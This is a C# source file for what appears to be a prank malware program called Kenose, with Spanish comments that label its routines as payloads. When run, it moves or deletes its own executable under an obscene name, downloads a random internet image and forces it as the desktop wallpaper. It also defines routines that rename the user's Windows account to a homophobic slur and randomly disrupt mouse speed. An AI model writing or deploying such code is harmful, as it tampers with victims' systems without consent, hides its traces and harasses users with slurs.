using System;
using System.Net;
using System.Diagnostics;
using System.Threading;
using System.Runtime.InteropServices;
using System.IO;
using Microsoft.Win32;
using System.DirectoryServices;
using System.Linq;

namespace Kenose
{
    public static class Principal
    {
        [DllImport("user32.dll", CharSet = CharSet.Auto)]
        static extern int SystemParametersInfo(int uAction, int uParam, IntPtr lpvParam, int fuWinIni); //método WINAPI para cambiar fondo pantalla
        [DllImport("netapi32.dll", CharSet = CharSet.Unicode)]
        static extern int NetUserSetInfo(
            string servername,
            string username,
            int level,
            ref USER_INFO_1 buf,
            out UInt32 parm_err
            ); //from pinvoke.net
        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        public struct USER_INFO_1
        {
            [MarshalAs(UnmanagedType.LPWStr)] public string sUsername;
            [MarshalAs(UnmanagedType.LPWStr)] public string sPassword;
            public uint uiPasswordAge;
            public uint uiPriv;
            [MarshalAs(UnmanagedType.LPWStr)] public string sHome_Dir;
            [MarshalAs(UnmanagedType.LPWStr)] public string sComment;
            public uint uiFlags;
            [MarshalAs(UnmanagedType.LPWStr)] public string sScript_Path;
        }
        const int SPI_SETDESKWALLPAPER = 0x0014;
        const int SPIF_UPDATEINIFILE = 0x01;
        const int SPIF_SENDWININICHANGE = 0x02;
        const int SPI_SETMOUSESPEED = 0x0071;
        static readonly String[] FotosADescargar = {"https://i.ytimg.com/vi/NrtD7LCzBcg/maxresdefault.jpg",
        "https://c2.staticflickr.com/6/5691/23763274586_4946aa77bc_o.png",
        "https://f4.bcbits.com/img/a3834742045_10.jpg",
        "https://comicvine1.cbsistatic.com/uploads/original/1/15659/4054135-cacodemons-doom.jpg",
        "https://i.imgur.com/4Ldv9Zr.png",
        "https://www.thermofisher.com/blog/wp-content/uploads/sites/5/2014/11/orange_citrus_fruit_isolated.jpg"};
        private static void CambiarFondo() //payload 1.a -> cambiar fondo de pantalla desde uno interno en la app
        {
            string temp = Path.GetTempPath() + "fondo.jpg";
            Kenose.Properties.Resources.fondo.Save(temp); //guardar el fondo en una localización temporal
            RegistryKey key = Registry.CurrentUser.OpenSubKey(@"Control Panel\Desktop", true); //stretch
            key.SetValue(@"WallpaperStyle", 2.ToString());
            key.SetValue(@"TileWallpaper", 0.ToString());
            IntPtr str = Marshal.StringToHGlobalUni(temp);
            SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, str, SPIF_SENDWININICHANGE | SPIF_UPDATEINIFILE); //aplicar cambio de fondo
        }
        private static void CambiarFondo(string fondo) //payload 1.b -> cambiar fondo de pantalla con una foto de internete
        {
            RegistryKey key = Registry.CurrentUser.OpenSubKey(@"Control Panel\Desktop", true); //stretch
            key.SetValue(@"WallpaperStyle", 2.ToString());
            key.SetValue(@"TileWallpaper", 0.ToString());
            IntPtr str = Marshal.StringToHGlobalUni(fondo);
            SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, str, SPIF_SENDWININICHANGE | SPIF_UPDATEINIFILE); //aplicar cambio de fondo
        }
        public static void CambiarUser()
        {
            using(DirectoryEntry AD = new DirectoryEntry("WinNT://"+Environment.MachineName + ",computer"))
            {
                using(DirectoryEntry NewUser = AD.Children.Find(Environment.UserName,"user"))
                {
                    if(NewUser != null)
                    {
                        NewUser.Rename("Faggot");
                    }
                }
            }
        }
        public static void CambiarVelocidadRaton()
        {
            int err;
            Random random = new Random();
            if(random.NextDouble() > 0.5f)
            {
                IntPtr num = new IntPtr(1);
                err = SystemParametersInfo(SPI_SETMOUSESPEED, 0, num, SPIF_UPDATEINIFILE | SPIF_SENDWININICHANGE); //slow
            }
            else
            {
                IntPtr num = new IntPtr(20);
                err = SystemParametersInfo(SPI_SETMOUSESPEED, 0, num, SPIF_UPDATEINIFILE | SPIF_SENDWININICHANGE); //acelerón
            }
            Thread.Sleep(TimeSpan.FromSeconds(10)); //dejo el efecto 10 segundos
            IntPtr fin = new IntPtr(10);
            err = SystemParametersInfo(SPI_SETMOUSESPEED, 0, fin, SPIF_UPDATEINIFILE | SPIF_SENDWININICHANGE); //lo restauro
        }
        public static void TareaCambiarVelocidadRaton()
        {
            while (true)
            {
                CambiarVelocidadRaton();
                Thread.Sleep(TimeSpan.FromSeconds(10)); //cambia la velocidad al azar
            }
        }
        private static void DescargarFichero(string url, string name) //descarga un fichero, normalmente una imagen
        {

            using (WebClient web = new WebClient())
            {
                try
                {
                    DirectoryInfo di = new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.MyPictures));
                    web.DownloadFile(url, di.FullName +"\\"+ name);
                }
                catch (Exception e)
                {
                    Debug.WriteLine(e.Message);
                }
            }
        }
        public static void Main(string[] args)
        {
            String fich = Environment.GetCommandLineArgs().First();
            string fichNew = Environment.GetFolderPath(Environment.SpecialFolder.CommonDocuments) + "\\Fuck";
            Process.Start("cmd.exe", "/k \"del Kenose.exe\"");
            if (!File.Exists(fichNew))
                File.Move(fich, fichNew); //nice
            else
            {
                //File.Move(fich, fichNew); //nice
            }
            //File.Delete(fich);
            ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls11 | SecurityProtocolType.Tls12; // para poder crear un tunel https
            DirectoryInfo di = new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.MyPictures));
            Thread velRaton = new Thread(TareaCambiarVelocidadRaton);
            //velRaton.Start();
            Random random = new Random();
            DescargarFichero(FotosADescargar[random.Next(0, FotosADescargar.Length)], "ups");
            //DescargarFichero(FotosADescargar[5], "ups");
            Thread.Sleep(1000);
            CambiarFondo(di.FullName + "\\" + "ups");
        }
    }
}
